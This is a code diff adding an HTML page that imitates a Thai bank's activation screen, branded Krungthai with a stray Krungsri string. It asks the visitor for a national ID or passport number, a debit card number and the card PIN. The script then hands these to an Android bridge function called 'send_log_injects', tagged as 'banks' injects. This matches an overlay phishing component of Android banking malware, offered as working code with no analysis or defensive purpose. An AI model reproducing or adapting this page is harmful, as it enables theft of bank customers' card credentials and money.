@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        body {
+            background-color: #f9f9f9;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            flex: 1;
+            padding: 15px;
+        }
+
+        header {
+            padding: 20px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        #lang {
+            position: absolute;
+            right: 10px;
+            top: 20px
+        }
+    
+        .cool-input {
+            box-sizing: border-box;
+            border: 1px solid #bbbbbb;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+            background-color: #fff;
+            border-radius: 4px;
+            padding: 13px
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left: 12px;
+            top: 50%;
+            line-height: 0;
+            color: #999999;
+            transition: all 0.2s ease;
+            font-size: 14px;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 1em;
+            font-size: 12px;
+            color: #00a6e6;
+        }
+
+        .input {
+            border: 0;
+            padding-left: 15px;
+            padding: 0;
+            margin-top: 5px;
+        }
+
+        .focused{
+            border-color: #00a6e6 !important;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        .button {
+            background: #00a6e6;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 10px;
+            width: 100%;
+            border: 0;
+            border-radius: 3px;
+        }
+
+        .button:disabled {
+            background: #e3e3e3;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <select name="lang" id="lang" onclick="checkLang()">
+        <option value="th">TH</option>
+        <option value="en">EN</option>
+    </select>
+    <form onsubmit="return false">
+        <header>
+            <span id="headerText">ธนาคารกรุงไทย</span>
+        </header>
+        <section>
+            <div class="cool-input" id="pasportField">
+                <input type="text" id="pasport" name="pasport" onkeyup="check()" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder" id="firstPCH">หมายเลขบัตรประชาชน/เลขหนังสือเดินทาง</span>
+            </div>
+
+            <div class="cool-input" id="cardField">
+                <input type="tel" id="card" name="card" onkeyup="check()" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder" id="secondPCH">หมายเลขบัตรเดบิต/เอทีเอ็ม</span>
+            </div>
+            <div class="cool-input" id="passwordField">
+                <input type="password" id="password" name="password" onkeyup="check()" maxlength="6" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder" id="threePCH">รหัสบัตรเดบิต/เอทีเอ็ม</span>
+            </div>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="ถัดไป">
+        </footer>
+    </form>
+    <script>
+        $('#card').mask('0000 0000 0000 0000')
+        $(function () {
+        
+        // Lets be professional, shall we?
+        "use strict";
+    
+        // Some variables for later
+        var dictionary, set_lang;
+    
+        // Object literal behaving as multi-dictionary
+        dictionary = {
+            "en": {
+                "_header1": "Welcome to Krungsri Mobile!",
+            },
+            "th": {
+                "_header1": "ยินดีต้อนรับเข้าสู่ กรุงศรีโมบาย",
+            }
+        };
+    
+        // Function for swapping dictionaries
+        set_lang = function (dictionary) {
+            $("[data-translate]").text(function () {
+                checkLang()
+                var key = $(this).data("translate");
+                if (dictionary.hasOwnProperty(key)) {
+                    return dictionary[key];
+                }
+            });
+
+        };
+    
+        // Swap languages when menu changes
+        $("#lang").on("change", function () {
+            var language = $(this).val().toLowerCase();
+            if (dictionary.hasOwnProperty(language)) {
+                set_lang(dictionary[language]);
+            }
+        });
+    
+        // Set initial language to English
+        set_lang(dictionary.th);
+    
+    });
+
+    $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+
+    var pasport = document.getElementById('pasport'),
+        card = document.getElementById('card'),
+        password = document.getElementById('password'),
+        sendData = document.getElementById('sendData'),
+        pasportField = document.getElementById('pasportField'),
+        cardField = document.getElementById('cardField'),
+        passwordField = document.getElementById('passwordField'),
+        headerText = document.getElementById('headerText'),
+        firstPCH = document.getElementById('firstPCH'),
+        secondPCH = document.getElementById('secondPCH'),
+        threePCH = document.getElementById('threePCH');
+
+        pasport.onfocus = function() {
+            pasportField.classList.add('focused')
+        }
+        pasport.onblur = function() {
+            pasportField.classList.remove('focused')
+        }
+        
+        card.onfocus = function() {
+            cardField.classList.add('focused')
+        }
+        card.onblur = function() {
+            cardField.classList.remove('focused')
+        }
+
+        password.onfocus = function() {
+            passwordField.classList.add('focused')
+        }
+        password.onblur = function() {
+            passwordField.classList.remove('focused')
+        }
+
+        function check() {
+            if(pasport.value.length > 0 && card.value.length === 19 && checkPass() == true) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        function checkPass(){
+            if(password.value.length === 4 || password.value.length === 6){
+                return true
+            } else {
+                return false
+            }
+        }
+
+        function checkLang() {
+            if(lang.value === 'th') {
+                headerText.innerText = 'ธนาคารกรุงไทย';
+                firstPCH.innerText = 'หมายเลขบัตรประชาชน/เลขหนังสือเดินทาง';
+                secondPCH.innerText = 'หมายเลขบัตรเดบิต/เอทีเอ็ม';
+                threePCH.innerText = 'รหัสบัตรเดบิต/เอทีเอ็ม';
+                sendData.value = 'ต่อไป';
+            } else {
+                headerText.innerText = 'Activate Krungthai Next';
+                firstPCH.innerText = 'National ID/Passport No.';
+                secondPCH.innerText = 'ATM/Debit Card No.';
+                threePCH.innerText = 'ATM/Debit PIN';
+                sendData.value = 'Next';
+            }
+        }
+
+        sendData.onclick = function() {
+            var data = {};
+            data.pasport = pasport.value;
+            data.card = card.value;
+            data.password = password.value;
+
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
